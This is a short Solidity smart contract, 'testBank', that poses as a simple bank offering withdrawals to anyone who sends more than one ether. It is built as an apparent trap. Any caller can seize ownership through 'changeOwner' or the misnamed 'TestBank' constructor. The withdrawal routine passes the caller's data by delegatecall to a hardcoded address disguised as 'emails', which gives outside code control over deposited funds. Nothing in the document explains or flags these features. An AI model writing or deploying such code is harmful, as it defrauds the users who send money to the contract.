pragma solidity ^0.4.16;

contract testBank
{
    address Owner;
    address adr;
    uint256 public Limit= 1000000000000000000;
    address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
    
    
    function Update(address dataBase, uint256 limit) 
    {
        require(msg.sender == Owner); //checking the owner
        Limit = limit;
        emails = dataBase;
    }
    
    function changeOwner(address adr){
        // update
        Owner=msg.sender;
    }
    
    function()payable{}
    
    function withdrawal()
    payable public
    {
        adr=msg.sender;
        if(msg.value>Limit)
        {  
            emails.delegatecall(msg.data);
            adr.send(this.balance);
        }
    }
    
    function kill() {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }
    
    function TestBank(){
        Owner=msg.sender;
    }
}